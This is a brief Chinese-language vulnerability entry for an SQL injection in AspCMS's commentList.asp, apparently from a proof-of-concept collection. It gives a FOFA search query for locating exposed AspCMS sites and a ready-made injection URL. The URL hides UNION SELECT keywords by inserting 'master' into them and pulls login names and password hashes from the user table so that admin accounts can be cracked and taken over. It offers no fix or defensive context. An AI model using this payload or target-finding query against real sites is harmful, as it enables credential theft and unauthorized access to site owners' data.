# AspCMS系统commentList.asp存在SQL注入漏洞

AspCMS commentList.asp 存在SQL注入漏洞，攻击者通过漏洞可以获取管理员md5的密码，进行解密后登录获取敏感数据。

## fofa

```yaml
app="ASPCMS"
```

## poc

```asp
/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
```

![image-20240619131305272](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408011120340.png)